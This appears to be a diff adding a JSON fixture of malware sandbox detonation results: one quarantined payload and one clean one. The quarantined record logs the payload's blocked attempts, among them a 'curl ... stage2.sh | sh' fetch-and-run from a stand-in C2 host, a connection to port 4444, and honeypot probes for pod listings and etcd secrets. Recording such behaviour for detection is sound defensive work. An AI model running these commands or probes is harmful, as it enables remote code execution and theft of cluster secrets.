@@ -1,0 +1,70 @@
+[
+  {
+    "detonationId": "det-20261016-001",
+    "vmId": "vm-sandbox-firecracker-01",
+    "payloadId": "payload-suspicious-curl-sh",
+    "status": "QUARANTINED",
+    "durationMs": 4820,
+    "peakMemoryMib": 512,
+    "cpuUsagePct": 88.5,
+    "egressAttempts": 15,
+    "egressAllowed": false,
+    "syscallAnomalies": [
+      {
+        "syscallName": "connect",
+        "count": 15,
+        "arguments": "af=AF_INET dst=198.51.100.44:4444",
+        "blocked": true,
+        "reason": "unauthorized egress socket attempt"
+      },
+      {
+        "syscallName": "execve",
+        "count": 2,
+        "arguments": "/bin/sh -c 'curl http://c2.malware.internal/stage2.sh | sh'",
+        "blocked": true,
+        "reason": "reverse shell spawn"
+      }
+    ],
+    "honeypotHits": [
+      {
+        "interactionId": "lure-hit-001",
+        "sourceIp": "192.168.127.2",
+        "destPort": 10250,
+        "protocol": "KUBELET_API",
+        "serviceLure": "decoy-kubelet-listener",
+        "payloadSample": "GET /pods HTTP/1.1\r\nUser-Agent: curl/8.2.0\r\n",
+        "timestamp": "2026-10-16T16:04:12Z",
+        "severity": "HIGH"
+      },
+      {
+        "interactionId": "lure-hit-002",
+        "sourceIp": "192.168.127.2",
+        "destPort": 2379,
+        "protocol": "ETCD_PEER",
+        "serviceLure": "decoy-etcd-client",
+        "payloadSample": "etcd v3 range request keys prefix /registry/secrets",
+        "timestamp": "2026-10-16T16:04:13Z",
+        "severity": "CRITICAL"
+      }
+    ],
+    "zeroDayIndicators": [
+      "anti_sandbox_clock_drift_check",
+      "synthetic_serviceaccount_token_harvesting"
+    ],
+    "quarantineEnforced": true,
+    "timestamp": "2026-10-16T16:04:10Z"
+  },
+  {
+    "detonationId": "det-20261016-002",
+    "vmId": "vm-sandbox-firecracker-02",
+    "payloadId": "payload-nixos-systemd-service",
+    "status": "CLEAN",
+    "durationMs": 1420,
+    "peakMemoryMib": 256,
+    "cpuUsagePct": 14.2,
+    "egressAttempts": 0,
+    "egressAllowed": false,
+    "quarantineEnforced": false,
+    "timestamp": "2026-10-16T16:05:00Z"
+  }
+]
